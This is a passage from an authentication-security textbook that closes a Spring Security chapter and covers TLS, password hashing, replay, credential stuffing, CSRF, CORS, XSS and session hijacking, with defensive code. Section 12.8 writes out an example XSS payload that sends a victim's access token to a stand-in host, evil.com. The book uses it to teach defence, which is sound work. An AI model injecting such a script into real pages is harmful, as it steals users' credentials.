- **Prevent user enumeration.** Returning "no such user" for an unknown email and "wrong password" for a known one lets an attacker harvest valid accounts by observing the difference. Return one generic `Invalid credentials` for both — and be aware that *timing* can leak the same information, since a missing user skips the ~300ms BCrypt comparison entirely. High-security systems hash a dummy password when the user is not found, to equalize the time.
- **Erase credentials.** `ProviderManager` clears the raw password from the `Authentication` after successful verification by default. Do not switch that off, and do not stash the raw password in a custom principal object.
- **Never log the `Authorization` header**, per Chapter 4, section 4.9. Spring's `DEBUG` logging for `org.springframework.security` is invaluable while developing and must not be enabled in production.
- **Lock down the actuator.** `/actuator/**` can expose environment variables, configuration properties, and heap dumps — which is to say, your signing secrets and database password. Expose only `/actuator/health` publicly; require `ROLE_ADMIN` for the rest.
- **Set `sessionCreationPolicy(STATELESS)` for token APIs.** Otherwise Spring creates an `HttpSession` for every authenticated request, silently reintroducing server-side state and the memory growth JWT was chosen to avoid.

---

## Chapter 11 Summary

- Spring Security is a **chain of servlet filters** running before your controllers — not a helper library you call.
- Authentication filters run **early** and only *populate* the context; `AuthorizationFilter` runs **last** and does the rejecting. That ordering is Chapter 3's principle as executable infrastructure.
- The verification pipeline is: filter builds an unauthenticated `Authentication` → `AuthenticationManager` → `AuthenticationProvider` → `UserDetailsService` (loads the user) + `PasswordEncoder` (checks the password) → authenticated token in `SecurityContextHolder`.
- `UserDetailsService` **loads**; it never compares passwords. `PasswordEncoder` (BCrypt) **compares**, and stores its salt inside the hash string.
- `hasRole("X")` checks for `ROLE_X`; `hasAuthority("X")` checks for `X`. Mismatching the two produces silent, unexplained 403s.
- `authorizeHttpRequests` matches **top to bottom, first match wins** — specific rules first, `.anyRequest().authenticated()` last.
- **URL-based rules** handle coarse access; **`@PreAuthorize`** handles resource-specific and ownership checks, and can delegate to a plain testable bean.
- `@PreAuthorize` is proxy-based, so **self-invocation bypasses it entirely** — a silent failure.
- Disable CSRF only for stateless token APIs; keep it for anything cookie-based.

---

## Interview Questions — Chapter 11

**Q1. Walk me through what happens when a request with a JWT hits a Spring Boot API.**
The request enters `springSecurityFilterChain`. Your custom `JwtAuthFilter` (registered via `addFilterBefore`) reads the `Authorization` header, verifies the signature and expiry, builds an authenticated `Authentication` with the user's authorities, and stores it in `SecurityContextHolder` — then always continues the chain. `AuthorizationFilter`, running last, evaluates the `authorizeHttpRequests` rules against that context: no authentication → `AuthenticationEntryPoint` → 401; authenticated but insufficient authority → `AccessDeniedHandler` → 403; otherwise the request reaches `DispatcherServlet` and your controller, where any `@PreAuthorize` is evaluated.

**Q2. What's the difference between `UserDetailsService` and `AuthenticationProvider`?**
`UserDetailsService` is a data-access concern: given a username, return the stored credential and authorities, or throw. `AuthenticationProvider` is the verification strategy: it decides *how* a credential type is checked. The standard `DaoAuthenticationProvider` uses a `UserDetailsService` to fetch the user and a `PasswordEncoder` to compare passwords. You implement a custom `UserDetailsService` to change *where users live*; a custom `AuthenticationProvider` to change *what counts as proof*.

**Q3. Why does `hasRole("ADMIN")` sometimes fail even though the user clearly has the ADMIN authority?**
Because `hasRole` transparently prepends `ROLE_`, so it is actually looking for `ROLE_ADMIN`. If the authority was stored via `.authorities("ADMIN")` rather than `.roles("ADMIN")`, the strings do not match and every request 403s with no explanatory error. Use `hasAuthority("ADMIN")`, or store it with the prefix — just be consistent on both sides.

**Q4. When is it safe to disable CSRF protection?**
When authentication credentials are never attached automatically by the browser — i.e., a stateless API where the client explicitly sets an `Authorization` header on every request. CSRF depends on the browser auto-attaching a credential (Chapter 7, section 7.8); with no cookie-based session there is nothing to forge. If any part of the app authenticates via cookies, CSRF protection must stay on.

**Q5. Why can `@PreAuthorize` silently fail to run?**
It is implemented via a proxy that wraps the bean. If an annotated method is invoked from another method on the *same* instance, the call never leaves the object, so the proxy is bypassed and the check is skipped with no error. The same limitation applies to `@Transactional`. Move the annotated method to a different bean.

**Q6. Why should "user not found" and "wrong password" return the same response?**
Distinguishing them lets an attacker enumerate valid accounts — a precursor to credential stuffing (Chapter 12). Both should produce a single generic `401 Invalid credentials`, and ideally take a similar amount of time, since skipping the BCrypt comparison for a nonexistent user is itself a measurable timing signal.

---

## Hands-On Exercises — Chapter 11

1. Take the `SecurityConfig` in section 11.5 and deliberately move `.anyRequest().permitAll()` to the *top* of `authorizeHttpRequests`. Confirm that every protected endpoint is now open, and explain why in terms of first-match-wins ordering.
2. Enable `logging.level.org.springframework.security=DEBUG` and make one authenticated request. Identify, in the log output, each filter from the diagram in section 11.1 as it runs.
3. Reproduce the `hasRole`/`hasAuthority` trap: store an authority as `.authorities("ADMIN")`, guard an endpoint with `hasRole("ADMIN")`, confirm the 403, then print the actual authorities to prove the cause.
4. Write a `@PreAuthorize("@accountSecurity.canAccess(authentication, #id)")` check as in section 11.8, then write a plain JUnit test for `AccountSecurity.canAccess` — with no Spring context at all. Note how much easier this is to test than an inline SpEL expression.
5. Reproduce the self-invocation bug: add two methods to one controller, annotate the second with `@PreAuthorize("hasRole('ADMIN')")`, call it from the first as a non-admin, and confirm the check never fires.

## Mini Project — Chapter 11

Build a **role-based library management API** using everything in this chapter.

Requirements:
- Three roles: `MEMBER`, `LIBRARIAN`, `ADMIN`, persisted in a real database via a custom `UserDetailsService`.
- `POST /api/auth/register` (public, BCrypt-hashes the password) and `POST /api/auth/login` (returns a JWT via `AuthenticationManager`, per section 11.7).
- URL-level rules: `GET /api/books/**` for any authenticated user; `POST`/`PUT` for `LIBRARIAN` and above; `DELETE` for `ADMIN` only.
- Method-level rule: `GET /api/loans/{id}` accessible only to the member who owns that loan, or to any `LIBRARIAN` — implemented via `@PreAuthorize` delegating to a testable `@Component`, not an inline SpEL expression.
- Custom `AuthenticationEntryPoint` and `AccessDeniedHandler` returning consistent JSON error bodies, and prove with `curl` that you get **401** with no token and **403** with a valid `MEMBER` token on an `ADMIN` route.
- A written note identifying which requirements above are *authentication* and which are *authorization*, referring back to Chapter 3.

---

## Preparing for Chapter 12

You can now build authentication correctly in a framework. Chapter 12 steps back out to the attacker's side of the table: what TLS actually does for you, how password hashing really works, and the specific named attacks — replay, MITM, credential stuffing, CSRF, XSS, session hijacking, token theft — that every mechanism in this book was shaped by. Much of it will feel like the answer to "*why* was that rule a rule?"

---

*End of Chapter 11.*

---

# Chapter 12 — Authentication Security

## 12.0 Where we left off

Every chapter so far has deferred something to "Chapter 12." Basic Auth's HTTPS requirement (5.8), why passwords need slow hashing (5.7), what `HttpOnly` actually protects against (7.5), why CSRF works at all (7.8), why a stolen bearer token is so damaging (4.4). This chapter is where those debts are paid.

The organizing idea: **every rule in this book exists because of a specific attack.** Learn the attack and the rule becomes obvious and permanent, instead of a checklist item you half-remember. So each section here is structured as *attack first, defence second*.

---

## 12.1 HTTPS, TLS, and SSL — what encryption actually buys you

**The confusion, cleared up first:**

| Term | What it really means |
|---|---|
| **SSL** | The original protocol (SSL 2.0, 3.0). **Every version is broken and deprecated.** Nobody should run SSL. |
| **TLS** | The successor and the thing actually in use today. TLS 1.2 is the acceptable minimum; TLS 1.3 is current. |
| **HTTPS** | Just HTTP running inside a TLS tunnel. Not a separate protocol. |

People say "SSL certificate" out of habit; they mean a TLS certificate. Fine in conversation, wrong in a config file: if your server config still permits SSLv3 or TLS 1.0, that is a real finding, not pedantry.

**What TLS gives you — exactly three things:**

```
   1. CONFIDENTIALITY  Nobody on the network path can READ the traffic.
                       (This is what makes Base64 in Basic Auth survivable — Ch. 5)

   2. INTEGRITY        Nobody can MODIFY the traffic undetected.

   3. AUTHENTICATION   You know you're talking to the real api.mybank.com,
      (of the server)  because a Certificate Authority vouched for it.
```

Point 3 is the one people forget, and it is the one that stops man-in-the-middle attacks. Encryption alone is useless if you are encrypting to the attacker.

**The handshake, at the level you need:**

```
   Client                                              Server
     │                                                    │
     │  1. ClientHello: "I support TLS 1.3, these ciphers"  │
     │ ──────────────────────────────────────────────────>│
     │                                                    │
     │  2. ServerHello + CERTIFICATE                        │
     │     (the cert contains the server's PUBLIC KEY and    │
     │      a signature from a Certificate Authority)         │
     │ <──────────────────────────────────────────────────│
     │                                                    │
     │  3. Client VERIFIES the certificate:                   │
     │     - signed by a CA my OS/browser trusts?              │
     │     - not expired? not revoked?                          │
     │     - does the domain match what I typed?                 │
     │     ANY failure -> abort. This is the MITM defence.        │
     │                                                    │
     │  4. Key exchange -> both sides derive the SAME              │
     │     symmetric session key (nobody watching can)              │
     │                                                    │
     │  5. All further HTTP — headers, body, cookies, tokens —      │
     │     encrypted with that session key                            │
     │ <═════════════════════════════════════════════════>│
```

> **Remember:** TLS protects data **in transit only**. It does nothing for data at rest in your database, nothing about a stolen token being replayed over a perfectly valid TLS connection, and nothing about a malicious script running inside your own page. Those need sections 12.3, 12.7, and 12.10 respectively. "We use HTTPS" is a floor, not a security posture.

**Practical requirements:**

```nginx
# Redirect all plain HTTP to HTTPS — no exceptions, not even for /health
server {
    listen 80;
    server_name api.mybank.com;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name api.mybank.com;

    ssl_protocols TLSv1.2 TLSv1.3;    # never TLSv1 / TLSv1.1 / any SSL
    ssl_prefer_server_ciphers off;     # correct for TLS 1.3

    # HSTS: tells the browser "never speak plain HTTP to me again",
    # which closes the gap where the FIRST request is http:// and can be
    # intercepted before the redirect arrives (see sslstrip, section 12.7).
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
```

> **Common Mistake:** terminating TLS at a load balancer and then speaking **plain HTTP** between the load balancer and your application servers, on the assumption that "the internal network is trusted." Anyone who gains a foothold inside that network — a compromised container, a misconfigured sidecar — reads every `Authorization` header in plaintext. This is precisely the assumption zero-trust architectures (Chapter 13) exist to reject.

---

## 12.2 Hashing and salting — why passwords are special

Chapter 8, section 8.1 defined hashing. Here is why password hashing needs a *different kind* of hash than everything else.

**The attack: offline brute force.** An attacker steals your `users` table. They now have unlimited time, unlimited attempts, and no rate limiting, because they are attacking the *hashes* on their own hardware — your server is not involved. Modern GPUs compute:

```
   SHA-256:   ~10,000,000,000 guesses per second  (10 billion/s on a GPU rig)
   BCrypt(12):        ~30,000 guesses per second  (~300,000x slower)
```

Against a fast hash, every password in the top 10-million-password list falls in **under a second**. This is why "we hashed the passwords with SHA-256" is a breach, not a mitigation.

**Defence 1 — salt.** A unique random value per user, stored alongside the hash.

```
   WITHOUT SALT:
     alice -> SHA256("password123") = ef92b778...
     bob   -> SHA256("password123") = ef92b778...   <- IDENTICAL
     Attacker instantly sees alice and bob share a password, and one
     precomputed "rainbow table" lookup cracks BOTH — and everyone else
     in every other breached database who used that password.

   WITH SALT:
     alice -> SHA256("x7Fq2z" + "password123") = 9c1a...   salt: x7Fq2z
     bob   -> SHA256("mK9pLw" + "password123") = 44be...   salt: mK9pLw
     Same password, different hashes. Rainbow tables are useless, and each
     password must be attacked individually.
```

The salt is **not secret** — it is stored in plaintext right next to the hash. Its job is uniqueness, not secrecy.

**Defence 2 — deliberate slowness.** A password hash function is *designed* to be expensive, with a tunable cost factor you raise as hardware gets faster.

| Algorithm | Verdict |
|---|---|
| **Argon2id** | Best current choice. Memory-hard, so GPUs and ASICs lose their advantage. |
| **BCrypt** | Excellent and ubiquitous. Fine for essentially every application. Note: silently truncates input at 72 bytes. |
| **scrypt** | Good, memory-hard. Less common in mainstream frameworks. |
| **PBKDF2** | Acceptable, and often required for compliance (FIPS). Weakest of the four against GPUs — needs a high iteration count. |
| SHA-256 / SHA-512 | **Not for passwords.** Fine for API keys (Ch. 6), file integrity, JWT signatures. |
| MD5 / SHA-1 | Broken. Not for anything security-relevant. |

```python
# Python — Argon2id, the modern default
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)  # 64 MB of RAM per hash

hash_str = ph.hash("secret123")   # salt is generated and embedded automatically
# $argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$RdescudvJCsgt3ub+b+dWRWJTmaaJObG

def check(stored_hash: str, supplied: str) -> bool:
    try:
        ph.verify(stored_hash, supplied)
        # Cost factors get raised over time; rehash old entries on login,
        # while you legitimately have the plaintext in hand.
        if ph.check_needs_rehash(stored_hash):
            save_new_hash(ph.hash(supplied))
        return True
    except VerifyMismatchError:
        return False
```

```java
// Java — Argon2id via Spring Security
@Bean
public PasswordEncoder passwordEncoder() {
    // saltLength, hashLength, parallelism, memoryInKB, iterations
    return new Argon2PasswordEncoder(16, 32, 4, 65536, 3);
}
```

> **Remember:** the difference between hashing and encryption, one last time. **Encryption is reversible with a key** — use it for data you must read back (a stored OAuth refresh token). **Hashing is one-way** — use it for data you only ever need to *compare* (passwords, API keys). If you can recover a user's password, your design is wrong.

> **Common Mistake — "peppering" done wrong.** A *pepper* is a secret value, stored in your application config rather than the database, mixed in alongside the salt. It genuinely helps: a stolen database without the pepper is uncrackable. But it must be applied via HMAC with the pepper as the key, must be rotatable, and must never be lost — losing the pepper means every password becomes unverifiable. It is an optional advanced layer, not a substitute for Argon2/BCrypt.

---

## 12.3 Man-in-the-Middle (MITM)

**The attack:** an attacker positions themselves on the network path — a rogue coffee-shop access point, a compromised router, ARP spoofing on a LAN, a hostile ISP — and relays traffic between client and server while reading and modifying it.

```
   WITHOUT TLS:

   Client ────────> [ ATTACKER ] ────────> Server
          plaintext      │  reads the Authorization header,
                         │  Base64-decodes it (Ch. 5), now has
                         │  the actual password. Can also silently
                         │  alter the request body.
```

**Defence:** TLS with proper certificate validation (12.1). The certificate check is the part that matters — an attacker can offer *a* certificate, just not one a trusted CA signed for `api.mybank.com`.

**The variant that catches real systems — sslstrip.** The user types `mybank.com`, which is plain HTTP before the redirect. The attacker intercepts that first request and simply never lets the upgrade happen, proxying HTTPS to the server while serving HTTP to the victim. **HSTS** (12.1) is the specific fix: once a browser has seen the header, it refuses plain HTTP to that domain for `max-age` seconds without even sending a request.

> **Common Mistake — disabling certificate verification to "fix" an error.** Every language has the tempting one-liner: `verify=False` in Python's `requests`, a trust-all `X509TrustManager` in Java, `curl -k`. Each one **completely disables the MITM defence** while leaving the traffic encrypted, so it still looks secure. The overwhelmingly common cause is a corporate proxy or a self-signed development certificate — fix it by adding that CA to the trust store, never by turning verification off. This line reaches production more often than any other single mistake in this chapter.

---

## 12.4 Replay attacks

**The attack:** the attacker cannot read or modify an encrypted request, but they can *capture and re-send it later*. If the request was `POST /transfer {"to":"attacker","amount":500}`, replaying it 100 times transfers ₹50,000.

```
   Legitimate:  Client --[ signed request R ]--> Server   -> transfer happens
   Attacker captures R (from a log, a proxy, a compromised CDN)
   Later:       Attacker --[ same request R ]--> Server   -> transfer happens AGAIN
```

Note that TLS alone does **not** stop this if the attacker obtained the request some other way, and a bearer token (Chapter 4) is inherently replayable — that is exactly what "whoever holds it" means.

**Defences, in increasing strength:**

| Defence | How it works |
|---|---|
| **Short token lifetimes** | Chapter 8's 15-minute access tokens — bounds the replay window |
| **Nonce** | A unique value per request; the server records used nonces and rejects repeats |
| **Timestamp + window** | Request carries a timestamp; server rejects anything outside ±5 minutes (limits how many nonces must be remembered) |
| **Idempotency keys** | Client sends `Idempotency-Key: <uuid>`; the server returns the *original* response for a repeat instead of re-executing. Standard practice for payment APIs. |

```python
# Nonce + timestamp, the combination used by most signed-request APIs
import hmac, hashlib, time

SEEN_NONCES: dict[str, float] = {}    # Redis with TTL in production
WINDOW_SECONDS = 300

def verify_signed_request(body: bytes, nonce: str, timestamp: str, signature: str, secret: bytes):
    now = time.time()

    # 1. Timestamp inside the window — this is what BOUNDS the nonce store.
    if abs(now - float(timestamp)) > WINDOW_SECONDS:
        raise HTTPException(401, "Request timestamp outside acceptable window")

    # 2. Nonce not seen before — this is what stops the actual replay.
    if nonce in SEEN_NONCES:
        raise HTTPException(401, "Replay detected: nonce already used")

    # 3. Signature covers body + nonce + timestamp, so none can be swapped.
    expected = hmac.new(secret, body + nonce.encode() + timestamp.encode(),
                        hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected, signature):   # constant-time, Ch. 5
        raise HTTPException(401, "Invalid signature")

    SEEN_NONCES[nonce] = now
```

> **Remember:** the timestamp and the nonce are a *pair*, and neither works alone. A nonce with no timestamp means storing every nonce forever. A timestamp with no nonce means the attacker can replay freely within the 5-minute window. Together, you only need to remember nonces for the width of the window.

---

## 12.5 Brute force and credential stuffing

These are different attacks that people conflate.

| | Brute force | Credential stuffing |
|---|---|---|
| What the attacker has | One target account, many password guesses | Millions of **real** username/password pairs from *other* sites' breaches |
| Shape of traffic | Many attempts against **one** account | One or two attempts against **millions** of accounts |
| Why it works | Weak passwords | **Password reuse** across sites |
| Caught by | Per-account lockout | Per-account lockout catches almost nothing — every account sees only 1–2 tries |

Credential stuffing is by far the more common real-world attack, and the defence most teams implement (lock the account after 5 failures) is nearly useless against it.

**Layered defences:**

```
   Layer 1  Rate limit per IP           — cheap; attackers use botnets to spread across IPs
   Layer 2  Rate limit per account       — stops classic brute force
   Layer 3  Rate limit per IP+account     — narrows the credible traffic
   Layer 4  Exponential backoff            — 1s, 2s, 4s, 8s... makes bulk attempts uneconomic
   Layer 5  CAPTCHA after N failures        — breaks naive automation
   Layer 6  Breached-password screening      — reject known-leaked passwords AT REGISTRATION;
                                               this is what actually defeats stuffing
   Layer 7  MFA                              — the single most effective control that exists
   Layer 8  Anomaly detection                 — new country/device/impossible travel -> step up
```

```python
from datetime import datetime, timedelta, timezone

FAILED_ATTEMPTS: dict[str, list[datetime]] = {}

def check_login_allowed(email: str, ip: str):
    now = datetime.now(timezone.utc)
    for key, limit, window in [(f"acct:{email}", 5, 15), (f"ip:{ip}", 20, 15)]:
        recent = [t for t in FAILED_ATTEMPTS.get(key, []) if t > now - timedelta(minutes=window)]
        FAILED_ATTEMPTS[key] = recent
        if len(recent) >= limit:
            # 429, not 401 — and deliberately do NOT reveal whether the
            # account exists or how many attempts remain (section 12.11).
            raise HTTPException(429, "Too many attempts. Try again later.",
                                headers={"Retry-After": "900"})

def record_failure(email: str, ip: str):
    now = datetime.now(timezone.utc)
    FAILED_ATTEMPTS.setdefault(f"acct:{email}", []).append(now)
    FAILED_ATTEMPTS.setdefault(f"ip:{ip}", []).append(now)
```

> **Common Mistake — lockout as a denial-of-service weapon.** "Lock the account permanently after 5 failures" lets any attacker who knows a victim's email lock them out at will, permanently, for free. Prefer *temporary* lockouts with exponential backoff, and always require an unlock path (email verification) that does not depend on an administrator.

---

## 12.6 CSRF — Cross-Site Request Forgery

Chapter 7, section 7.8 introduced the mechanism. Here is the full defence.

**Root cause, restated:** the browser attaches cookies based on the **destination** domain, with no regard for **which site initiated** the request. So a request forged by `evil.com` and a genuine request from your own page look byte-for-byte identical to your server.

**Defence 1 — `SameSite` cookies** (the modern baseline):

```http
Set-Cookie: session_id=abc; HttpOnly; Secure; SameSite=Lax; Path=/
```

`Lax` blocks the cookie on cross-site `POST`s and subrequests while allowing normal link navigation. Modern browsers default to it, but **state it explicitly** — you are not defended by a default that an older client may not apply.

**Defence 2 — the synchronizer token pattern** (defence in depth, and still required for `SameSite=None`):

```
   1. Server generates a random CSRF token, tied to the user's session.
   2. It is delivered where a cross-site attacker CANNOT read it:
      embedded in the page, or in a JS-readable cookie for the double-submit variant.
   3. Every state-changing request must echo it in a HEADER: X-CSRF-Token: <value>
   4. Server compares header value against the session's token.

   Why this works: evil.com can make the victim's browser SEND a request
   (cookies attach automatically), but the Same-Origin Policy stops it from
   READING your page or your response — so it can never learn the token.
```

**Defence 3 — do not use cookies for API authentication.** A token sent in an explicit `Authorization` header is not attached automatically, so there is nothing to forge. This is why stateless JWT APIs legitimately disable CSRF protection (Chapter 11, section 11.11) — but note this trades CSRF exposure for XSS exposure (12.9), and does not make you safe, only differently exposed.

```java
// Spring Boot — CSRF protection for a cookie-session app
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    // Login/registration have no session to protect yet.
    .ignoringRequestMatchers("/api/auth/login", "/api/auth/register")
);
```

> **Common Mistake:** protecting `POST` but not `PUT`, `PATCH`, or `DELETE`. Every state-changing method needs the check. Equally: making a state-changing endpoint respond to `GET` — the transfer-via-`<img>` example in Chapter 7, section 7.8 only worked *because* the endpoint accepted `GET`. Keeping `GET` genuinely safe (Chapter 1, section 1.14) is itself a CSRF control.

---

## 12.7 CORS — what it is and what it is *not*

CORS is the most misunderstood item in this chapter, so let us be blunt: **CORS is not a security mechanism that protects your server. It is a mechanism that *relaxes* a browser restriction.**

**The default (Same-Origin Policy):** a browser will let JavaScript on `evil.com` *send* a request to `api.mybank.com`, but will not let it **read the response**. CORS is how your server opts into letting specific origins read responses.

```
   Origin = scheme + host + port. All three must match.

   https://app.mybank.com          vs
   https://api.mybank.com   -> DIFFERENT origin (host differs)
   http://app.mybank.com    -> DIFFERENT origin (scheme differs)
   https://app.mybank.com:8443 -> DIFFERENT origin (port differs)
```

**The preflight**, for anything beyond a simple request:

```http
OPTIONS /api/books HTTP/1.1
Origin: https://app.mybank.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.mybank.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 3600
```

```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    // EXPLICIT list. Never "*" when credentials are involved.
    config.setAllowedOrigins(List.of("https://app.mybank.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    config.setAllowCredentials(true);
    config.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

> **Common Mistake #1 — `Access-Control-Allow-Origin: *` with credentials.** Browsers reject this combination outright, so developers "fix" it by **reflecting the request's `Origin` header back** — which allows *every* origin, including the attacker's, and now `evil.com`'s JavaScript can read authenticated responses from your API. If you reflect an origin, validate it against an allowlist first.

> **Common Mistake #2 — thinking CORS protects your API.** It does not. `curl`, Postman, a mobile app, and any server-side script ignore CORS entirely — it is enforced by *browsers*, on *responses*. Loosening CORS never bypasses your authentication; tightening it never substitutes for authentication. And note the request often still **reaches your handler** even when the browser blocks the response, so a state-changing `GET` still executes.

---

## 12.8 XSS — Cross-Site Scripting

**The attack:** an attacker gets *their* JavaScript executing inside *your* page's origin. That script then runs with all your page's privileges — it can read `localStorage`, read non-`HttpOnly` cookies, call your API with the user's credentials automatically attached, and rewrite the page.

```
   1. Attacker submits a "comment": <script>fetch('https://evil.com/steal?t='
                                    + localStorage.getItem('access_token'))</script>
   2. Your app stores it and later renders it into the page as raw HTML.
   3. EVERY user who views that page runs the attacker's script,
      inside YOUR origin, and ships their token to the attacker.
```

| Type | How the payload arrives |
|---|---|
| **Stored** | Saved in your database and served to everyone — the most damaging |
| **Reflected** | Echoed back from a URL parameter; requires luring the victim to a crafted link |
| **DOM-based** | Never touches the server; client-side JS writes untrusted input into the DOM |

**Defences:**

1. **Encode on output, contextually.** The rule is *escape at the point of rendering*, and the correct escaping differs for HTML body, HTML attribute, JavaScript, and URL contexts. Modern template engines (React JSX, Thymeleaf, Jinja2 autoescape) do this by default — the danger is the explicit opt-out: `dangerouslySetInnerHTML`, `th:utext`, `|safe`, `innerHTML`.
2. **Validate on input** as a secondary layer — never the primary one, since the same data may be rendered into several different contexts.
3. **Content-Security-Policy** — the strongest structural defence, because it stops injected script from executing even if encoding fails:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'
```

4. **`HttpOnly` cookies** — this is the payoff of Chapter 7, section 7.5. An `HttpOnly` session cookie is invisible to `document.cookie`, so XSS cannot *exfiltrate* it.

> **Remember — the honest limit of `HttpOnly`.** It stops the attacker from *stealing* the cookie. It does **not** stop them from *using* it: their script can still call `fetch('/api/transfer', {method:'POST', credentials:'include', ...})` from inside your origin, and the browser attaches the cookie automatically. `HttpOnly` converts "attacker owns the account forever, from anywhere" into "attacker acts as the user while they are on the page." A real improvement — not immunity.

---

## 12.9 Token storage in the browser — the argument with no clean winner

This is the most-argued question in front-end authentication, and it deserves an honest answer rather than a slogan.

| | `localStorage` | `HttpOnly` cookie |
|---|---|---|
| Readable by XSS? | **Yes** — trivially | **No** |
| Usable by XSS? | Yes | **Yes** (attacker calls your API from your origin) |
| CSRF exposure? | No (manual attachment) | **Yes** — needs `SameSite` + CSRF tokens |
| Works cross-domain? | Yes | Awkward (needs `SameSite=None; Secure`) |
| Works for mobile/native? | N/A — no browser storage involved | No |
| Survives a page refresh | Yes | Yes |

```
   The trade is NOT "one is secure and one is not":

     localStorage  -> you accept XSS token theft, you avoid CSRF
     HttpOnly cookie -> you avoid XSS token theft, you accept CSRF (mitigable)

   Both fail badly under XSS. If an attacker is running script in your
   origin, you have already lost the round — the question is only how
   much they take with them.
```

**The pattern most production systems converge on:**

```
   Refresh token  -> HttpOnly, Secure, SameSite=Strict cookie,
                     scoped with Path=/api/auth/refresh so it is only ever
                     sent to the one endpoint that needs it
   Access token   -> held in memory (a JS variable), never persisted
                     - not in localStorage -> XSS cannot read it from storage
                     - not in a cookie      -> no CSRF on API calls
                     - lost on refresh      -> silently re-obtained via the
                       refresh cookie on page load
```

> **Interview Tip:** if asked "where should you store a JWT?", the weak answer picks one and calls the other insecure. The strong answer states the trade-off above, names the split pattern (refresh in an `HttpOnly` cookie, access token in memory), and adds the point that carries most weight: **XSS defeats every storage strategy, so preventing XSS matters more than the storage choice.**

---

## 12.10 Session hijacking, token theft, and leakage

**Where credentials actually leak in the real world** — nearly always through carelessness rather than cryptanalysis:

| Leak channel | How it happens | Fix |
|---|---|---|
| **URLs** | Token in a query string → server logs, browser history, `Referer` header sent to third parties | Never put credentials in URLs (Ch. 4, section 4.5) |
| **Logs** | Middleware that dumps all request headers "for debugging" | Explicit redaction of `Authorization` and `Cookie` (Ch. 4, section 4.9) |
| **Error reporting** | Sentry/Datadog capturing full request context on an exception | Configure scrubbing before you enable the integration |
| **Source control** | Secrets in `.env`, config files, or committed test fixtures | Secret scanning in CI; the key-prefix convention from Ch. 6, section 6.2 |
| **Client-side storage** | XSS reading `localStorage` (12.8) | CSP, output encoding, in-memory access tokens |
| **Analytics / session replay** | Tools that record the DOM and network traffic wholesale | Mask auth fields explicitly |
| **CI/CD** | Secrets echoed into build logs, or exposed to fork PRs | Masked variables; never expose secrets to untrusted PR builds |

**Session hijacking** is the outcome: the attacker obtains a valid session ID or token by any route above and uses it as the victim.

**Detection and containment:**

```python
def validate_session_context(session: dict, request) -> None:
    """Bind a session to loose properties of its original context.

    Deliberately does NOT bind to the exact IP: mobile users change IP
    constantly (cell <-> WiFi), and strict IP binding logs out legitimate
    users all day. Bind to things that should not change mid-session.
    """
    if session["user_agent"] != request.headers.get("user-agent"):
        revoke_session(session["id"])
        raise HTTPException(401, "Session context changed; please log in again")

    # Impossible travel: two continents, four minutes apart.
    if geoip_country(request.client.host) != session["country"]:
        flag_for_review(session["user_id"])         # log + alert
        require_step_up_auth(session["user_id"])     # re-verify, don't silently allow
```

> **Remember:** always regenerate the session ID (or issue a new token) at every **privilege change** — login (session fixation, Ch. 7 section 7.8), password change, email change, and elevation to admin. And a password change should **invalidate every other active session**, because the user changing their password is very often *reacting to* a suspected compromise.

---

## 12.11 Clickjacking and security headers

**Clickjacking:** the attacker embeds your real, authenticated page in a transparent `<iframe>` over their own page. The victim believes they are clicking "Play video"; they are actually clicking "Transfer funds" on your site, in their authenticated session.

```
   ┌──────────────────────────────┐
   │  evil.com                      │
   │                                │
   │      [ Click here to win! ]     │  <- what the victim SEES
   │                                │
   │   ╔══════════════════════════╗ │
   │   ║ your-bank.com in an iframe ║ │  <- invisible (opacity: 0),
   │   ║   [ Confirm Transfer ]      ║ │     positioned exactly under
   │   ╚══════════════════════════╝ │     the visible button
   └──────────────────────────────┘
```

**The complete security-header set:**

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Cache-Control: no-store
```

| Header | What it prevents |
|---|---|
| `Strict-Transport-Security` | Downgrade to plain HTTP / sslstrip (12.3) |
| `frame-ancestors 'none'` | **Clickjacking** — the modern replacement for `X-Frame-Options` |
| `X-Content-Type-Options: nosniff` | Browser guessing a content type and executing an upload as script |
| `Referrer-Policy` | Leaking URLs (and anything in them) to third-party sites |
| `Cache-Control: no-store` | Authenticated responses being cached by a shared proxy and served to someone else |

```java
http.headers(headers -> headers
    .httpStrictTransportSecurity(h -> h.includeSubDomains(true).maxAgeInSeconds(31536000))
    .frameOptions(f -> f.deny())
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; frame-ancestors 'none'"))
    .referrerPolicy(r -> r.policy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

---

## 12.12 The attack-to-defence map

The whole chapter on one page:

| Attack | Primary defence | Chapter that introduced it |
|---|---|---|
| Eavesdropping / MITM | TLS 1.2+, cert validation, HSTS | 5.8, 12.1, 12.3 |
| Offline password cracking | Argon2id/BCrypt + per-user salt | 5.7, 12.2 |
| Rainbow tables | Per-user salt | 12.2 |
| Timing attack | Constant-time comparison | 5.5 |
| Replay | Nonce + timestamp, short TTLs, idempotency keys | 12.4 |
| Brute force | Per-account rate limit, backoff, lockout | 12.5 |
| Credential stuffing | Breached-password screening, **MFA** | 12.5 |
| CSRF | `SameSite`, CSRF tokens, header-based auth | 7.8, 12.6 |
